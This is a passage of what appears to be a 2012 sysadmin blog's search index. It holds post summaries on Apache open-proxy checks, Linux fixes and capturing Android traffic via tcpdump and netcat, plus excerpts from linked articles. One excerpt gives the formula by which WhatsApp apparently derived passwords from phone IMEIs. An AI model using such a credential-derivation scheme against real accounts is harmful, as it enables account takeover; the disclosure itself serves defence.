\" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + \" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" availableFonts: ['STIX', 'TeX'],\" + \" preferredFont: 'STIX',\" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript); (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); }","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/09/22/monitorizar-el-tamano-de-un-directorio-con-monit/","loc":"https://karpoke.ignaciocano.com/2012/09/22/monitorizar-el-tamano-de-un-directorio-con-monit/"},{"title":"Comprobar que no tenemos configurado Apache como un proxy abierto","text":"Revistando logs de Apache, he visto que tenía algunas entradas del tipo: bash 93.174.93.52 - - [18/Sep/2012:02:23:11 +0200] \"GET http://myproxylists.com/my-http-headers HTTP/1.1\" 404 1046 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 (.NET CLR 3.5.30729)\" 93.174.93.52 - - [20/Sep/2012:08:21:08 +0200] \"GET http://myproxylists.com/my-http-headers HTTP/1.1\" 404 1046 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 (.NET CLR 3.5.30729)\" Este suele ser el resultado de peticiones maliciosas que buscan encontrar servidores proxy abiertos. Si encontramos entradas de este tipo, lo primero que deberíamos hacer es comprobar que tenemos configurado el servidor correctamente, para no permitir hacer de proxy a peticiones de anónimos. De hecho, si no necesitamos un servidor proxy , lo mejor es asegurarnos que la directiva ProxyRequests no está inicializada a on . Si el servidor está bien configurado, este tipo de peticiones fallarán, y se verá un código 404 en el log . Un código 200 no significa necesariamente que esté mal configurado. Si no hemos configurado el nombre del servidor, Apache aceptará peticiones de URLs absolutas, ya que no tiene forma de saber bajo qué nombres de dominio se ejecuta. Para prevenirlo, podemos utilizar las directivas ServerName y ServerAlias para que las peticiones de otros dominios sean rechazadas. Si queremos comprobar si nuestro servidor está haciendo de proxy podemos ejecutar: bash $ telnet localhost 80 GET http://www.google.com HTTP/1.1 Host: www.google.com Referencias » Apache Server Frequently Asked Questions » HTTP Wiki - Proxy abuse","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/09/21/comprobar-que-no-tenemos-configurado-apache-como-un-proxy-abierto/","loc":"https://karpoke.ignaciocano.com/2012/09/21/comprobar-que-no-tenemos-configurado-apache-como-un-proxy-abierto/"},{"title":"My dog: the paradox","text":"Matthew Inman | theoatmeal.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/09/20/my-dog-the-paradox/","loc":"https://karpoke.ignaciocano.com/2012/09/20/my-dog-the-paradox/"},{"title":"An open letter to Senator Rockefeller","text":"Dear Sen. Rockefeller, I am a cyber expert. I invented a key technology known as \"IPS\" that is a standard part of network defense. I invented hacking techniques like \"sidejacking\" that are a standard part of network offense. I am a coder who has written a million lines of production code. I am a \"pentester\" who has performed simulated attacks that confirm your worst nightmares about power-grid blackouts and financial meltdowns. Your letter [*] was na¯ve. There is no such thing as \"best\" practice, because there is no such thing as \"adequate\" practice. The Fortune 500 has not figured out how to stop Chinese hackers from breaking into web browsers, or how to separate code from data injected into websites, or how to stop an inadvertent connection between a secured and unsecured network. This has allowed me to hack (in tests) into Fortune 500 companies, even those that follow the very best of \"best practice\". Robert David Graham | erratasec.blogspot.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/09/20/an-open-letter-to-senator-rockefeller/","loc":"https://karpoke.ignaciocano.com/2012/09/20/an-open-letter-to-senator-rockefeller/"},{"title":"Cosmo, the Hacker 'God' Who Fell to Earth","text":"Cosmo is huge \" 6 foot 7 and 220 pounds the last time he was weighed, at a detention facility in Long Beach, California on June 26. And yet he's getting bigger, because Cosmo \" also known as Cosmo the God, the social-engineering mastermind who weaseled his way past security systems at Amazon, Apple, AT&T, PayPal, AOL, Netflix, Network Solutions, and Microsoft \" is just 15 years old. He turns 16 next March, and he may very well do so inside a prison cell. Cosmo was arrested along with dozens of others in a recent multi-state FBI sting targeting credit card fraud. It is the day before his court date, but he doesn't know which task force is investigating him or the name of his public defender. He doesn't even know what he's been charged with. It's tough to narrow it down; he freely admits to participation in a wide array of crimes. Mat Honan | wired.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/09/16/cosmo-the-hacker-god-who-fell-to-earth/","loc":"https://karpoke.ignaciocano.com/2012/09/16/cosmo-the-hacker-god-who-fell-to-earth/"},{"title":"How to Argue on the Internet Without Becoming a Troll","text":"It's September of an election year, and people are drawing lines, taking stands, and proclaiming their political beliefs. Even the lurkers, who brag that they \"never post political stuff on Facebook\" find their trigger fingers twitching over the \"share\" button. The internet is a battlefield, and you simply can't get around online without being drawn into a shootout from time to time. When that happens, these tips will keep you knocking down opponents without losing your cool or becoming a troll. Jesse Nivens | lifehacker.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/09/15/how-to-argue-on-the-internet-without-becoming-a-troll/","loc":"https://karpoke.ignaciocano.com/2012/09/15/how-to-argue-on-the-internet-without-becoming-a-troll/"},{"title":"Southampton engineers a Raspberry Pi Supercomputer","text":"Computational Engineers at the University of Southampton have built a supercomputer from 64 Raspberry Pi computers and Lego. The team, led by Professor Simon Cox, consisted of Richard Boardman, Andy Everett, Steven Johnston, Gereon Kaiping, Neil O'Brien, Mark Scott and Oz Parchment, along with Professor Cox's son James Cox (aged 6) who provided specialist support on Lego and system testing. Professor Cox comments: \"As soon as we were able to source sufficient Raspberry Pi computers we wanted to see if it was possible to link them together into a supercomputer. We installed and built all of the necessary software on the Pi starting from a standard Debian Wheezy system image and we have published a guide so you can build your own supercomputer.\" » southampton.ac.uk - Simon Cox | Steps to make a Raspberry Pi Supercomputer","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/09/13/southampton-engineers-a-raspberry-pi-supercomputer/","loc":"https://karpoke.ignaciocano.com/2012/09/13/southampton-engineers-a-raspberry-pi-supercomputer/"},{"title":"Well, Actually","text":"As software developers, we develop habits that allow us to build products that work and do not fail under stress. Every software developer knows what an \"off-by-one\" error is, and like the Karate Kid, we train extensively so we can avoid those traps. We learn how to avoid these and other similar software problems and we sharpen our skills to find logic errors. As we mature as developers, finding logic errors and incomplete solutions becomes our way of life. It defines us. But our engineering strength is also our social weakness. Countless times as engineers you will find yourself interrupting someone telling a story, an anecdote or a joke to correct a false assumption, provide an extra fact that the narrator overlooked, give a bigger perspective on the problem or point out that the joke premise is actually flawed. You can identify this behavior because the person interrupting usually starts with the phrase \"Well, actually...\". Miguel de Icaza | tirania.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/09/10/well-actually/","loc":"https://karpoke.ignaciocano.com/2012/09/10/well-actually/"},{"title":"HTML Responsive Images Extension","text":"This proposal adds new elements and attribute to [HTML5] to enable different sources of images based on browser and display characteristics. The proposal addresses multiple use cases such as images used in responsive web designs and different images needed for high density displays. This proposal allows content authors to provide user agents with the information they need to select the best image source. The current img element only allows for a single source of an image, but there are numerous use cases where document authors need to define different image sources depending on the factors such as the design, size resolution, and display density. The best image source may be an image sized appropriately for the display size or pixel density. Or the best image source may be a different version of an image that has been modified by the author to be suitable for a particular use (see: art direction use case). » w3.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/09/07/html-responsive-images-extension/","loc":"https://karpoke.ignaciocano.com/2012/09/07/html-responsive-images-extension/"},{"title":"WhatsApp is using IMEI numbers as passwords","text":"As you probably already heard in recent news, 1,000,001 Apple UDID's were leaked. It's unfortunate that so many apps use UDID's to identify users since it's extremely insecure. This brings me to WhatsApp, a free messaging service, used by millions of people. Their system runs on a modified version of XMPP (Extensible Messaging and Presence Protocol). There is nothing wrong with using XMPP, but there is a problem in how WhatsApp handle authentication. If you installed WhatsApp on an Android device for example, your password is likely to be an inverse of your phones IMEI number with an MD5 cryptographic hash thrown on top of it (without salt). md5(strrev('your-imei-goes-here')) Sam Granger | samgranger.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/09/07/whatsapp-is-using-imei-numbers-as-passwords/","loc":"https://karpoke.ignaciocano.com/2012/09/07/whatsapp-is-using-imei-numbers-as-passwords/"},{"title":"4 unix commands I abuse every day","text":"A co-worker watched me type the other day and noticed that I use certain Unix commands for purposes other than they are intended. Yes, I abuse Unix commands. Tom Limoncelli | everythingsysadmin.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/09/06/4-unix-commands-i-abuse-every-day/","loc":"https://karpoke.ignaciocano.com/2012/09/06/4-unix-commands-i-abuse-every-day/"},{"title":"Solucionado el error \"No se pudo abrir el fichero de bloqueo «/var/lock/aptitude»\" al actualizar Raspbmc","text":"Tengo una Raspbmc instalada en la Raspberry Pi. Al utilizar aptitude para instalar cualquier paquete o actualizar el sistema, recibo el siguiente error: bash $ sudo aptitude update [ ERR] Leyendo la información de estado E: No se pudo abrir el fichero de bloqueo \"/var/lock/aptitude\" - open (2: No existe el fichero o el directorio) W: No se pudo bloquear el fichero de almacén. Esto significa habitualmente que dpkg u otra herramienta apt está instalando paquetes. Se abrirá en modo de sólo lectura, ¡se PERDERÁN todos los cambios que realice al estado de los paquetes! En realidad, lo que sucede es que /var/lock es un enlace simbólico que apunta a /run/lock , que no existe, y de ahí que no lo encuentre. Creando el directorio en cuestión, se soluciona el problema: bash $ sudo mkdir /run/lock","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/09/06/solucionado-el-error-no-se-pudo-abrir-el-fichero-de-bloqueo-varlockaptitude-al-actualizar-raspbmc/","loc":"https://karpoke.ignaciocano.com/2012/09/06/solucionado-el-error-no-se-pudo-abrir-el-fichero-de-bloqueo-varlockaptitude-al-actualizar-raspbmc/"},{"title":"Solucionado el error \"$MFTMirr does not match $MFT (record 0).\" al montar una partición NTFS","text":"Si intentamos montar un disco o partición en NTFS, el formato que utiliza Windows, que no ha sido desconectada \"de forma segura\", es posible que no podamos montarla y que recibamos el siguiente error: bash $ sudo mount -t ntfs-3g /dev/sdb1 /media/ntfs $MFTMirr does not match $MFT (record 0). Failed to mount '/dev/sdb1': Error de entrada/salida NTFS is either inconsistent, or there is a hardware fault, or it's a SoftRAID/FakeRAID hardware. In the first case run chkdsk /f on Windows then reboot into Windows twice. The usage of the /f parameter is very important! If the device is a SoftRAID/FakeRAID then first activate it and mount a different device under the /dev/mapper/ directory, (e.g. /dev/mapper/nvidia_eahaabcc1). Please see the 'dmraid' documentation for more details. Incluso si utilizamos el parámetro -o force nos sigue devolviendo el mismo error. Afortunadamente, existe el paquete ntfsprogs , disponible en los repositorios, que incluye una herramienta con la que podemos solucionarlo: bash $ sudo ntfsfix /dev/sdb1 Mounting volume... $MFTMirr does not match $MFT (record 0). FAILED Attempting to correct errors... Processing $MFT and $MFTMirr... Reading $MFT... OK Reading $MFTMirr... OK Comparing $MFTMirr to $MFT... FAILED Correcting differences in $MFTMirr record 0...OK Processing of $MFT and $MFTMirr completed successfully. Setting required flags on partition... OK Going to empty the journal ($LogFile)... OK Checking the alternate boot sector... FIXED NTFS volume version is 3.1. NTFS partition /dev/sdb1 was processed successfully. Y ahora ya sí podremos montarla normalmente. El paquete ntfsprogs incluye, además, herramientas para realizar todo tipo de acciones sobre volúmenes NTFS: crear, clonar, comparar, comprobar, redimensionar, desfragmentar, mostrar información de ficheros, listar directorios, deshacer el borrado de ficheros, etc. Referencias » How to fix '$MFTMirr does not match $MFT (record 0)'","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/09/06/solucionado-el-error-mftmirr-does-not-match-mft-record-0-al-montar-una-particion-ntfs/","loc":"https://karpoke.ignaciocano.com/2012/09/06/solucionado-el-error-mftmirr-does-not-match-mft-record-0-al-montar-una-particion-ntfs/"},{"title":"The open source technology behind Twitter","text":"Without open source, Twitter wouldn't exist. Every Tweet you send and receive touches open source software on its journey between computers and mobile devices. We were curious about how much open source is used at Twitter. Beyond that, we wanted to discover how open source may influence the culture at Twitter, Inc. We asked Chris Aniszczyk, Open Source Manager at Twitter, to share the company's open source story. Aniszczyk will be keynoting at this month's LinuxCon, August 29 through 31, in San Diego, CA. His topic: The open source technology behind a Tweet. Jason Hibbets | opensource.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/09/01/the-open-source-technology-behind-twitter/","loc":"https://karpoke.ignaciocano.com/2012/09/01/the-open-source-technology-behind-twitter/"},{"title":"Los dueños de la información II","text":"Hace año y medio que recopilé datos sobre la distribución de la propiedad de los medios de comunicación, compilando esos datos en un solo gráfico: los dueños de la información. Parece que el gráfico tuvo buena acogida y a mucha gente le pareció interesante. A mí, al menos, me parece útil. Una herramienta para tener presente, cuando consultamos algún medio de comunicación, a qué intereses sirve. Así que me puse manos a la obra, recopilando datos de los movimientos empresariales en el sector, para poder mostraros un nuevo gráfico, ampliado, corregido y actualizado. Mendigo | esmola.wordpress.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/08/31/los-duenos-de-la-informacion-ii/","loc":"https://karpoke.ignaciocano.com/2012/08/31/los-duenos-de-la-informacion-ii/"},{"title":"Old Spice Muscle Music","text":"Watch me jam solo, then use the special interactive player to record your own remix. Go ahead, show me what you got! Terry Crews | vimeo.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/08/31/old-spice-muscle-music/","loc":"https://karpoke.ignaciocano.com/2012/08/31/old-spice-muscle-music/"},{"title":"Walking paper","text":"Paper Biped Robot making process from H/P MPM (Mechanical Paper Model) http://www.geocities.jp/kikousya290821/newmpm.htm All paper made Biped Robot without wooden shafts and elastic band as power source » geocities.jp/kikousya290821 | via microsiervos.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/08/30/walking-paper/","loc":"https://karpoke.ignaciocano.com/2012/08/30/walking-paper/"},{"title":"Which Are More Legible: Serif or Sans Serif Typefaces?","text":"Back in 1998 when Times New Roman was still widely used on the web, my then boss made sure we always designed our web sites with Arial, as she hated the look of serif fonts on the web. Was it the case that sans serif fonts were more legible, or was it just a matter of taste? In 2003 as part of my master's degree I reviewed over 50 empirical studies in typography and found a definitive answer. An argument has been raging for decades within the scientific and typographic communities on what seems a very insignificant issue: Do serifs contribute to the legibility of typefaces, and by definition, are sans serif typefaces less legible? To date, no one has managed to provide a conclusive answer to this issue. Alex Poole | alexpoole.info","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/08/27/which-are-more-legible-serif-or-sans-serif-typefaces/","loc":"https://karpoke.ignaciocano.com/2012/08/27/which-are-more-legible-serif-or-sans-serif-typefaces/"},{"title":"Tales Of A First Time Driver Developer","text":"Since 2004, I've owned a ThinkPad A22m - a laptop that came out in 2001. Much to the dismay of certain friends, I still feel no need to purchase a newer computer. I've often said that this old hardware can do everything I need while still letting me run modern software. However, it now seems like I will have to take some responsibility for the code if I want that to still be true in the future. Specifically, I am talking about open source ATI drivers on GNU / Linux. The four main video card lines released by ATI (now owned by AMD) have been Wonder, Mach, Rage and Radeon. I don't think Wonder cards have any features that would warrant the development of a dedicated driver but Linux drivers for the other three have been written. The Radeon driver is actively maintained by software engineers at AMD and some people who work for other software companies. The other two? Not so much. The Rage 128 driver was especially in need of a major update recently. And since my computer has a Rage Mobility graphics card, I felt motivated to start working on the code even though I had never hacked such a low-level piece of software before. Since the effort has largely succeeded, I would like to share my experiences with editing an open source video driver. The learning curve was quite steep and when I first started reading documentation, it seemed like it was written for a different audience. This post is going to be an unadultered attempt to get a completely new reader to catch on to what I did. I'm sure I will later find out that many things written in this post are technically incorrect, but I will not edit them. I want the only knowledge communicated in this piece to be the knowledge that one might reasonably be expected to have after jumping into driver development for the first time. Connor Classen Behan | smallperturbation.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/08/26/tales-of-a-first-time-driver-developer/","loc":"https://karpoke.ignaciocano.com/2012/08/26/tales-of-a-first-time-driver-developer/"},{"title":"Debian and I","text":"Debian is the most influential Linux distribution ever. Of the 305 active distributions listed on Distrowatch, 147 are derived from Debian, and 87 from Ubuntu, Debian's most famous off-shoot. In other words, 77% of the distributions being used today wouldn't exist without Debian. That makes Debian's nineteenth anniversary on August 16 worth a moment's reflection, not just technologically, but socially as well. For me, Debian and free software are hopelessly intertwined. While I had played about with Linux before, I only went hardcore when I started work on 5 July, 1999 at Stormix Technologies, an ultimately unsuccessful attempt to commercialize Debian. From there, I jumped ship to work at Progeny Linux System, which was founded by Ian Murdock and funded by Bruce Perens' short-lived Linux Capital Group, and very much traded on the reputation of the two Debian leaders behind it. In those few years, I worked with some of Debian's leading developers, including Branden Robinson, John Goerzen, and Jeff Licquia, and at conferences stumbled across most of the mover and shakers in free and open source software as well. In short, my introduction to free software was also my introduction to Debian. Bruce Byfield | linux-magazine.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/08/25/debian-and-i/","loc":"https://karpoke.ignaciocano.com/2012/08/25/debian-and-i/"},{"title":"¿Es posible tener un smartphone completamente libre?","text":"Desde el punto de vista del usuario ¿Se puede tener una plataforma Android basada exclusivamente en Software Libre? Este es mi análisis tras una experiencia de seis meses de uso. Pablo Hinojosa | osl.ugr.es","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/08/24/es-posible-tener-un-smartphone-completamente-libre/","loc":"https://karpoke.ignaciocano.com/2012/08/24/es-posible-tener-un-smartphone-completamente-libre/"},{"title":"Decipher MPPE by breaking MS-CHAP v2","text":"Our investigation focuses on Microsoft proprietary protocols with the help of a network trace and references. The steps that will be covered are specific to authentication view (MS-Chapv2), key derivation for encryption and the algorithm of the compression feature (MPPE/MPPC). Finally, to complete our approach, we will illustrate weaknesses through a new forensic tool dedicated to these protocols. Mainline : Details on MSChap-v2 : The first chapter aims to understand how the authentication protocol works ; Overview of MPPE protocol : We explain briefly the encryption protocol ; Overview of MPPC protocol : Here, we take a look at the compression feature ; Decipher MPPE by breaking MSCHAP-v2 : We decipher MPPE protocol with the help of MSChap-v2; Moxie Marlinspike | esec-pentest.sogeti.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/08/20/decipher-mppe-by-breaking-ms-chap-v2/","loc":"https://karpoke.ignaciocano.com/2012/08/20/decipher-mppe-by-breaking-ms-chap-v2/"},{"title":"Nyan Cat Telnet Server","text":"This is an animated, color, ANSI-text telnet server that renders a loop of the classic Nyan Cat animation. Open up a supported terminal and run: telnet miku.acm.uiuc.edu Kevin Lange | miku.acm.uiuc.edu","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/08/20/nyan-cat-telnet-server/","loc":"https://karpoke.ignaciocano.com/2012/08/20/nyan-cat-telnet-server/"},{"title":"10 Free Color Palettes From 10 Famous Paintings","text":"If you want to learn a thing or two about color, why not look to the true masters whose artistic work has stood the test of time? Great painters almost always possess a keen understanding of color that is truly impressive when you stop to appreciate it. Joshua Johnson | designshack.net","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/08/20/10-free-color-palettes-from-10-famous-paintings/","loc":"https://karpoke.ignaciocano.com/2012/08/20/10-free-color-palettes-from-10-famous-paintings/"},{"title":"Analizando el tráfico de red en Android con tcpdump, netcat y Wireshark","text":"Si necesitamos analizar el tráfico de red de nuestro Android, ya sea para depurar una aplicación o para ver qué uso de la red hacen las aplicaciones instaladas en el terminal, podemos recurrir a herramientas bien conocidas como tcpdump , netcat y Wireshark. Antes de empezar Antes de continuar, deberemos tener instaladas las herramientas de desarrollo para Android . Descargamos el paquete y lo descomprimimos: bash $ wget http://dl.google.com/android/android-sdk_r20.0.3-linux.tgz $ tar xvzf android-sdk_r20.0.3-linux.tgz Añadimos los directorios tools y platform-tools al PATH . Ejecutamos las siguientes líneas, y las añadimos también en el fichero ~/.bashrc , para incluirlas en el PATH del sistema: bash export ANDROID_HOME=$HOME/android-sdk-linux export PATH=$PATH:$ANDROID_HOME/tools:$ANDROID_HOME/platform-tools Abrimos el gestor de paquetes ejecutando: bash $ android sdk Instalaremos las SDK Tools y las SDK Platform-tools. Instalando tcpdump en Android Utilizaremos una versión de tcpdump que ha sido compilada para ARM. La podemos descargar de aquí tcpdump-arm : bash $ wget http://www.eecs.umich.edu/~timuralp/tcpdump-arm Ahora activaremos el modo depuración. En Android 4.0.3 se encuentra en el menú Ajustes > Opciones del desarrollador > Depuración de USB. En otras versiones puede variar ligeramente. Si no nos aparece esta opción, podemos probar pulsando 7 veces en el campo Build del menú Ajustes > Información. Acto seguido, conectamos el móvil a nuestro equipo mediante el cable USB. Si todo ha ido bien, podremos listar los dispositivos conectados ejecutando: bash $ adb devices List of devices attached 192B32A8955D29F device Enviamos la versión de tcpdump que hemos descargado al móvil y le cambiamos los permisos: bash $ adb push tcpdump-arm /data/local $ adb shell shell@android:/ $ cd /data/local shell@android:/data/local $ chmod 777 tcpdump-arm shell@android:/data/local $ su 1|shell@android:/data/local # ./tcpdump-arm -h tcpdump-arm version 4.0.0 libpcap version 1.0.0 Usage: tcpdump-arm [-aAdDefIKlLnNOpqRStuUvxX] [ -B size ] [ -c count ] [ -C file_size ] [ -E algo:secret ] [ -F file ] [ -G seconds ] [ -i interface ] [ -M secret ] [ -r file ] [ -s snaplen ] [ -T type ] [ -w file ] [ -W filecount ] [ -y datalinktype ] [ -z command ] [ -Z user ] [ expression ] Un ejemplo de captura de tráfico: bash shell@android:/data/local # ./tcpdump-arm -n -i wlan0 -p -s 0 -w out.pcap El argumento -n es para evitar traducir IPs a nombres, -i especifica la interfaz de red, -p indica que no sea en modo promiscuo, dado que de todas formas no iba a funcionar, -s 0 es para que capture todo el paquete desde el primer byte y -w envía la salida a un fichero. Cuando queramos parar, matamos el proceso con &#94;C y nos traemos el fichero de la captura, que podremos abrir con Wireshark: bash $ adb pull /data/local/out.pcap Actualizado el 20 de enero de 2014 Me he encontrado algún caso en el que al intentar ejecutar netcat , nos devuelve el siguiente error: bash $ adb shell ~ # nc /sbin/sh: nc: not found En este caso, podemos utilizar la versión que trae alguna aplicación, como por ejemplo SSH Droid: bash ~ # alias nc=\"/data/data/berserker.android.apps.sshdroid/home/bin/nc\" Otra opción podría ser utilizar BusyBox: bash ~ # find . -name busybox ./system/xbin/busybox ~ # alias nc=\"/system/xbin/busybox nc\" # debemos pasar el nombre del comando Analizar el tráfico en tiempo real Guardar el tráfico en un fichero para luego examinarlo puede estar bien en algunos casos, pero poder analizar en tiempo real también suena interesante. Lo que haremos será abrir una conexión entre el móvil y nuestro equipo mediante netcat , y pasar la salida de tcpdump a través de ella directamente hacia Wireshark. bash $ adb shell shell@android:/ $ su shell@android:/ # /data/local/tcpdump-arm -n -s 0 -i wlan0 -w - | nc -l -p 12345 O en un solo comando: bash $ adb shell \"su -c '/data/local/tcpdump-arm -n -s 0 -i wlan0 -w - | nc -l -p 12345'\" En nuestro equipo, creamos una redirección de un puerto en el móvil, el puerto en el que hemos lanzado netcat como servidor, a un puerto de nuestro equipo: bash $ adb forward tcp:12345 tcp:12345 Y utilizando netcat como cliente, pasamos su salida a Wireshark: bash $ nc 127.0.0.1 12345 | wireshark -k -S -i - Actualizado el 22 de julio de 2014 Si usamos ADB sobre red no es necesario que conectemos el móvil al ordenar por USB. Basta activar el modo de depuración y ejecutar: bash $ adb connect 192.168.1.51:5555 Referencias » Analyzing Android Network Traffic » Android: Binary solo » Android Developer Tools » Cross Compiling on Linux","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/08/20/analizando-el-trafico-de-red-en-android-con-tcpdump-netcat-y-wireshark/","loc":"https://karpoke.ignaciocano.com/2012/08/20/analizando-el-trafico-de-red-en-android-con-tcpdump-netcat-y-wireshark/"},{"title":"The Emerging Revolution in Game Theory","text":"The world of game theory is currently on fire. In May, Freeman Dyson at Princeton University and William Press at the University of Texas announced that they had discovered a previously unknown strategy for the game of prisoner's dilemma which guarantees one player a better outcome than the other. That's a monumental surprise. Theorists have studied Prisoner's Dilemma for decades, using it as a model for the emergence of co-operation in nature. This work has had a profound impact on disciplines such as economics, evolutionary biology and, of course, game theory itself. The new result will have impact in all these areas and more. The game is this: imagine Alice and Bob have committed a crime and are arrested. The police offer each one a deal--snitch and you go free while your friend does 6 months in jail. If both Alice and Bob snitch, they both get 3 months in jail. If they both remain silent, they both get one month in jail for a lesser offence. What should Alice and Bob do? » technologyreview.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/08/20/the-emerging-revolution-in-game-theory/","loc":"https://karpoke.ignaciocano.com/2012/08/20/the-emerging-revolution-in-game-theory/"},{"title":"El gran fraude de los cosméticos","text":"El pasado martes, Mercadona retiró 11 productos cosméticos después de una evaluación realizada por la Agencia Española de Medicamentos y Productos Sanitarios. Ayer, esa misma agencia publicó un comunicado explicando que el problema era de orden administrativo y no existía ningún peligro para la salud de los consumidores. Me parece un buen momento para que hablemos del verdadero problema de fondo. La industria cosmética se sostiene sobre una mentira: hacer creer a sus clientes que la eficacia de sus productos tiene una base científica. alberto | principiamarsupia.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/08/17/el-gran-fraude-de-los-cosmeticos/","loc":"https://karpoke.ignaciocano.com/2012/08/17/el-gran-fraude-de-los-cosmeticos/"},{"title":"New release under development; suggestions requested","text":"Fellow Linuxers, This is just to announce the imminent completion of a brand-new Linux release, which I'm calling the Debian Linux Release. This is a release that I have put together basically from scratch; in other words, I didn't simply make some changes to SLS and call it a new release. I was inspired to put together this release after running SLS and generally being dissatisfied with much of it, and after much altering of SLS I decided that it would be easier to start from scratch. The base system is now virtually complete (though I'm still looking around to make sure that I grabbed the most recent sources for everything), and I'd like to get some feedback before I add the \"fancy\" stuff. Ian A Murdock | comp.os.linux.development","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/08/17/new-release-under-development-suggestions-requested/","loc":"https://karpoke.ignaciocano.com/2012/08/17/new-release-under-development-suggestions-requested/"},{"title":"BSD vs Linux","text":"I run FreeBSD on my computers. A lot of my friends run Linux, or at least one of the distributions of it. Naturally, then, we agree that a Unix-style operating system is the right choice, but we disagree on which to use. It's been my impression that the BSD communit{y,ies}, in general, understand Linux far better than the Linux communit{y,ies} understand BSD. I have a few theories on why that is, but that's not really relevant. I think a lot of Linux people get turned off BSD because they don't really understand how and why it's put together. Thus, this rant; as a BSD person, I want to try to explain how BSD works in a way that Linux people can absorb. While there's overwhelming similarity between the operating systems in most cases, there are also a lot of differences. As you probe more into the differences, you find that they emerge from deep-seated disagreements. Some are disagreements over development methodology, some over deployment and usage, some about what's important, some about who's important, and some about which flavor of ice cream is superior. Just comparing the surface differences doesn't tell you anything; it's the deeper differences that both explain and justify why each group does things the way they do. Matthew D. Fuller | over-yonder.net/\\~fullermd","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/08/15/bsd-vs-linux/","loc":"https://karpoke.ignaciocano.com/2012/08/15/bsd-vs-linux/"},{"title":"Game deaths","text":"A compilation of classic arcade deaths, arranged to an 8-bit cover of \"Mad World\". The music is a cover of Mad World, by Tears for Fears. Rob Beschizza | boingboing.net","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/08/15/game-deaths/","loc":"https://karpoke.ignaciocano.com/2012/08/15/game-deaths/"},{"title":"Best Paper Awards in Computer Science (since 1996)","text":"Much of this data was entered by hand (obtained by contacting past conference organizers, retrieving cached conference websites, and searching CVs) so please email me if you notice any errors or omissions: bestpaper-AT-jeffhuang.com. I tried to collect best paper awards from the top-tier conferences in each area, but some conferences do not have such an award (e.g. SIGGRAPH, CAV). \"Distinguished paper award\" and \"outstanding paper award\" are included but not \"best student paper\" (e.g. NIPS) or \"best 10-year old paper\" (e.g. POPL) Jeff Huang | jeffhuang.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/08/15/best-paper-awards-in-computer-science-since-1996/","loc":"https://karpoke.ignaciocano.com/2012/08/15/best-paper-awards-in-computer-science-since-1996/"},{"title":"Python Ecosystem - An Introduction","text":"When developers shift from PHP, Ruby or any other platform to Python, the very first road block they face (most often) is a lack of an overall understanding of the Python ecosystem. Developers often yearn for a tutorial or resource that explains how to accomplish most tasks in a more or less standard way. What follows is an extract from the internal wiki at my workplace, which documents the basics of the Python ecosystem for web application development for our interns, trainees and experienced developers who shift to Python from other platforms. Mir Nazim | mirnazim.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/08/15/python-ecosystem-an-introduction/","loc":"https://karpoke.ignaciocano.com/2012/08/15/python-ecosystem-an-introduction/"},{"title":"Brainfuck beware: JavaScript is after you!","text":"I just made a tool to transform any javascript code into an equivalent sequence of ()[]{}!+ characters. You can try it here, or grab it from github or npm. Keep on reading if you want to know how it works. What do you know about 